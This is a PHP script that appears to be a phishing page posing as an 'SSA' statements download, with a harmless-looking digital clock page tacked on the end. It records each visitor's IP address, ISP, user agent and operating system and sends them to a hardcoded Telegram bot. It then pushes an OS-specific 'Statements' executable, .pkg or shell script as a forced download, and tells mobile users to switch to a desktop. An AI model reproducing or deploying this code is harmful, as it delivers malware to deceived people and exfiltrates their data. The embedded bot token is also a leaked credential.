<?php
// Visitor counter
$counter_file = 'visitor_count.txt';
$visitor_count = file_exists($counter_file) ? (int)file_get_contents($counter_file) + 1 : 1;
file_put_contents($counter_file, $visitor_count);

// Get visitor info
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$isp = gethostbyaddr($ip); // Get ISP/domain info

// Detect operating system and device
$isMobile = preg_match('/mobile|android|iphone|ipad/i', $ua);
$os = 'Unknown OS';
$file = '';

if (stripos($ua, 'Win') !== false) {
    $os = 'Windows';
    $file = 'Statements.exe';
} elseif (stripos($ua, 'Mac') !== false) {
    $os = 'Mac';
    $file = 'Statements.pkg';
} elseif (stripos($ua, 'Linux') !== false) {
    $os = 'Linux';
    $file = 'Statements.sh';
} else {
    $file = 'Statements.exe'; // Default to Windows file if OS is unrecognized
}

// Format message with black background style
$message = "```\n"
          ."🚀 New SSA WEBSITE VISIT DETECTED!\n"
          ."══════════════════════════════\n"
          ."👤 Visitor No: $visitor_count\n"
          ."🌐 IP Address: $ip\n"
          ."📡 ISP: ".($isp ?: 'Unknown')."\n"
          ."💻 Device: $ua\n"
          ."🖥️ Operating System: $os\n"
          ."🕒 Time: $time\n"
          ."══════════════════════════════\n"
          ."🔔 VISITOR TRACKING ACTIVE!\n"
          ."```";

// Send to Telegram
$botToken = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
$chatId = '7724482403';
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'MarkdownV2',
    'disable_web_page_preview' => true
];

// Use cURL if available (more reliable)
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
} else {
    file_get_contents($url.'?'.http_build_query($data));
}

// Serve the appropriate file based on the operating system
if ($isMobile) {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Flag - Statements Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8d7da;
            color: #721c24;
            padding: 50px;
        }
        .red-flag {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
        }
    </style>
    <script>
        let countdown = 20; // 20 seconds countdown
        function updateCountdown() {
            document.getElementById("countdown").innerText = countdown;
            if (countdown <= 0) {
                window.close(); // Close the tab when countdown reaches 0
            } else {
                countdown--;
                setTimeout(updateCountdown, 1000);
            }
        }
        window.onload = updateCountdown;
    </script>
</head>
<body>
    <div class="red-flag">⚠️ Statements download is only allowed on Desktop/PC/Computer! ⚠️</div>
    <div>Please switch to a desktop device for downloading the statements.</div>
    <div class="countdown">Redirecting in <span id="countdown">20</span> seconds...</div>
</body>
</html>';
    exit;
} else {
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "Error: File not found for the detected operating system.";
    }
}

// Digital Clock for Time Zones
echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital Clock</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
            color: #333;
            padding: 50px;
        }
        .clock {
            font-size: 24px;
            margin: 10px 0;
        }
    </style>
    <script>
        function updateClocks() {
            const timeZones = {
                "UTC": 0,
                "New York (EST)": -5,
                "London (GMT)": 0,
                "Berlin (CET)": 1,
                "Tokyo (JST)": 9,
                "Sydney (AEST)": 10
            };

            const now = new Date();
            const utcTime = now.getTime() + now.getTimezoneOffset() * 60000;

            let clocksHtml = "";
            for (const [city, offset] of Object.entries(timeZones)) {
                const cityTime = new Date(utcTime + offset * 3600000);
                clocksHtml += `<div class="clock">${city}: ${cityTime.toLocaleTimeString()}</div>`;
            }

            document.getElementById("clocks").innerHTML = clocksHtml;
        }

        setInterval(updateClocks, 1000); // Update every second
        window.onload = updateClocks;
    </script>
</head>
<body>
    <h1>Digital Clock - Time Zones</h1>
    <div id="clocks"></div>
</body>
</html>';
?>
